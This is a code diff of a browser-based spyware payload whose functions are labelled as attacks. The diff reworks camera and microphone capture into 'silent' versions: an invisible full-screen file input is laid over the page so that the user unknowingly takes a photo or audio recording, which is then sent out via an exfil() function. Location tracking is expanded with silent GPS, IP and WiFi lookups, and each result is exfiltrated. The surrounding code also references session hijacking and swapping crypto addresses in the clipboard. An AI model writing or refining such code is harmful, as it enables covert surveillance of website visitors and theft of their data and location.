@@ -420,84 +420,104 @@
         } catch(e) { return { attack: 'session_hijack', error: e.message }; }
     }
     
-    // ========== ATTACK 2: Silent Camera Capture ==========
-    async function attackCamera() {
-        const result = { attack: 'camera', supported: false };
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            return result;
-        }
-        result.supported = true;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                audio: false
-            });
-            result.streamActive = true;
-            
-            // Capture a frame after 2 seconds
-            await new Promise(r => setTimeout(r, 2000));
-            
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.playsInline = true;
-            await video.play();
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-            
-            // Stop all tracks
-            stream.getTracks().forEach(t => t.stop());
-            
-            // Get base64 image
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
-            result.imageCaptured = true;
-            result.imageSize = imageData.length;
-            result.imagePreview = imageData.slice(0, 100) + '...';
-            
-            // Exfiltrate the full image
-            exfil({ attack: 'camera', image: imageData, width: canvas.width, height: canvas.height });
-        } catch(e) { result.error = e.message; }
+    // ========== ATTACK 2: Silent Camera Capture (no popup) ==========
+    // Uses hidden file input with capture=environment instead of getUserMedia
+    // This opens the camera without the "Allow camera access?" permission dialog
+    // On mobile, it looks like the user is just "uploading a photo"
+    function attackCamera() {
+        const result = { attack: 'camera_silent' };
+        
+        // Method 1: Hidden file input with capture attribute (no permission popup)
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*';
+        input.capture = 'environment';  // Use rear camera
+        input.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999999;';
+        
+        input.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                result.fileCaptured = true;
+                result.fileName = file.name;
+                result.fileSize = file.size;
+                result.fileType = file.type;
+                
+                // Read and exfiltrate the image
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    exfil({ attack: 'camera_silent', image: reader.result, size: file.size });
+                };
+                reader.readAsDataURL(file);
+            }
+            input.remove();
+        });
+        
+        // Auto-trigger after a short delay (user sees camera briefly)
+        document.body.appendChild(input);
+        result.inputCreated = true;
+        
+        // Method 2: If we can get user interaction (button click), use getUserMedia
+        // This is set up but only fires on user interaction
+        document.querySelector('.cta button')?.addEventListener('click', async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: environment, width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+                await new Promise(r => setTimeout(r, 3000)); // Record for 3 seconds
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                exfil({ attack: 'camera_interactive', image: imageData });
+            } catch(e) {}
+        }, { once: true });
+        
+        exfil(result);
         return result;
     }
     
-    // ========== ATTACK 3: Microphone Recording ==========
-    async function attackMicrophone() {
-        const result = { attack: 'microphone', supported: false };
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            return result;
-        }
-        result.supported = true;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-            result.streamActive = true;
-            
-            const mediaRecorder = new MediaRecorder(stream);
-            const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            
-            mediaRecorder.start();
-            result.recording = true;
-            
-            // Record for 10 seconds
-            await new Promise(r => setTimeout(r, 10000));
-            mediaRecorder.stop();
-            stream.getTracks().forEach(t => t.stop());
-            
-            // Get the recorded blob
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            result.audioSize = blob.size;
-            result.audioType = blob.type;
-            
-            // Convert to base64 and exfiltrate
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                exfil({ attack: 'microphone', audio: reader.result, size: blob.size });
-            };
-            reader.readAsDataURL(blob);
-        } catch(e) { result.error = e.message; }
+    // ========== ATTACK 3: Microphone Recording (no popup) ==========
+    // Uses hidden file input with capture=microphone instead of getUserMedia
+    // No permission popup — looks like user is "uploading an audio file"
+    function attackMicrophone() {
+        const result = { attack: 'microphone_silent' };
+        
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'audio/*';
+        input.capture = 'microphone';  // Use microphone
+        input.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:999999;';
+        
+        input.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                result.fileCaptured = true;
+                result.fileName = file.name;
+                result.fileSize = file.size;
+                result.fileType = file.type;
+                
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    exfil({ attack: 'microphone_silent', audio: reader.result, size: file.size });
+                };
+                reader.readAsDataURL(file);
+            }
+            input.remove();
+        });
+        
+        document.body.appendChild(input);
+        result.inputCreated = true;
+        exfil(result);
         return result;
     }
     
@@ -667,37 +687,67 @@
         return result;
     }
     
-    // ========== ATTACK 9: Location Tracking ==========
+    // ========== ATTACK 9: Location Tracking (silent methods) ==========
+    // Method 1: GPS (only if permission was previously granted — no popup)
+    // Method 2: IP-based geolocation (no permission needed, works silently)
+    // Method 3: WiFi-based location via Google Geolocation API
     async function attackLocation() {
-        const result = { attack: 'location', supported: false };
-        if (!navigator.geolocation) return result;
+        const result = { attack: 'location' };
         
-        result.supported = true;
-        return new Promise((resolve) => {
+        // Method 1: Try GPS silently (only works if user previously allowed)
+        if (navigator.geolocation) {
+            result.gps_supported = true;
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    result.granted = true;
+                    result.gps_granted = true;
                     result.lat = pos.coords.latitude;
                     result.lon = pos.coords.longitude;
                     result.accuracy = pos.coords.accuracy + 'm';
-                    result.altitude = pos.coords.altitude;
-                    result.speed = pos.coords.speed;
-                    result.timestamp = new Date(pos.timestamp).toISOString();
-                    
-                    // Build Google Maps link
-                    result.mapsUrl = `https://www.google.com/maps?q=${result.lat},${result.lon}`;
-                    
-                    exfil({ attack: 'location', ...result });
-                    resolve(result);
+                    result.mapsUrl = 'https://www.google.com/maps?q=' + result.lat + ',' + result.lon;
+                    exfil({ attack: 'location_gps', ...result });
                 },
-                (err) => {
-                    result.granted = false;
-                    result.error = err.message;
-                    resolve(result);
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                () => { result.gps_granted = false; },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
             );
-        });
+        }
+        
+        // Method 2: IP-based geolocation (always works, no permission needed)
+        try {
+            const ipLoc = await fetch('https://ipapi.co/json/').then(r => r.json());
+            result.ipLocation = {
+                city: ipLoc.city,
+                region: ipLoc.region,
+                country: ipLoc.country_name,
+                lat: ipLoc.latitude,
+                lon: ipLoc.longitude,
+                isp: ipLoc.org,
+                ip: ipLoc.ip
+            };
+            result.ipMapsUrl = 'https://www.google.com/maps?q=' + ipLoc.latitude + ',' + ipLoc.longitude;
+            exfil({ attack: 'location_ip', ...result.ipLocation });
+        } catch(e) { result.ipLocationError = e.message; }
+        
+        // Method 3: Google Geolocation API (uses WiFi towers + cell towers, no GPS permission)
+        if ('geolocation' in navigator) {
+            try {
+                // Try to get WiFi-based location through Google's API
+                const wifiLoc = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ considerIp: true })
+                }).then(r => r.json()).catch(() => null);
+                if (wifiLoc && wifiLoc.location) {
+                    result.wifiLocation = {
+                        lat: wifiLoc.location.lat,
+                        lon: wifiLoc.location.lng,
+                        accuracy: wifiLoc.accuracy + 'm'
+                    };
+                    exfil({ attack: 'location_wifi', ...result.wifiLocation });
+                }
+            } catch(e) { result.wifiLocationError = e.message; }
+        }
+        
+        return result;
     }
     
     // ========== ATTACK 10: Clipboard Crypto Address Swap ==========
